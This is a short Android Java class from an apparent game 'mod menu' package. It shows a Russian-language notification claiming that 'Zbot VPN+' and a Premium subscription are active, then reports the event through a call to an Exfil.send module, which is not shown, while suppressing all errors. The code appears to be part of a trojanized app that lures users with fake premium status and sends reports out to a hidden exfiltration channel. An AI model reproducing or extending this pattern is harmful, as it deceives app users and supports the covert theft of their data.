package com.brawl.modmenu;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.os.Build;

public class WelcomeNotif {

    public static void show(Context ctx) {
        try {
            String ch = "zbot_welcome";
            NotificationManager nm = (NotificationManager)
                ctx.getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm == null) return;

            if (Build.VERSION.SDK_INT >= 26) {
                NotificationChannel c = new NotificationChannel(
                    ch, "Zbot VPN+", NotificationManager.IMPORTANCE_HIGH);
                nm.createNotificationChannel(c);
            }

            Notification.Builder b;
            if (Build.VERSION.SDK_INT >= 26) {
                b = new Notification.Builder(ctx, ch);
            } else {
                b = new Notification.Builder(ctx);
            }

            b.setContentTitle("Zbot VPN+ активирован")
             .setContentText("Поздравляем! Ваш Premium активен. Приятной игры!")
             .setSmallIcon(android.R.drawable.stat_sys_download_done)
             .setAutoCancel(true);

            nm.notify(999, b.build());
            Exfil.send("WELCOME", "Показано приветственное уведомление");
        } catch (Throwable ignored) {}
    }
}
